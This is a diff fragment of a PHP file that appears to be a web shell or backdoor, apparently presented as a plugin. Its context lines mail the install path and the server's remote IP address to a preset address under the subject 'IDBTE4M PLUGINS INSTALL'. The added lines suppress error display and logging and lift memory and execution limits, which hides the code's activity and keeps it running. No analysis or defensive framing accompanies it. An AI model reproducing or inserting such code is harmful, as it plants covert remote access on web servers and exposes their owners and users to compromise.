@@ -47,7 +47,14 @@ $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]
 mail($tujuanmail, "IDBTE4M PLUGINS INSTALL", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 <?php
-error_reporting(0)
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+ini_set('memory_limit', '-1');
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('max_execution_time', 5000);
+error_reporting(0);
 
 @ini_set('error_log',NULL); 
 @ini_set('log_errors',0); 
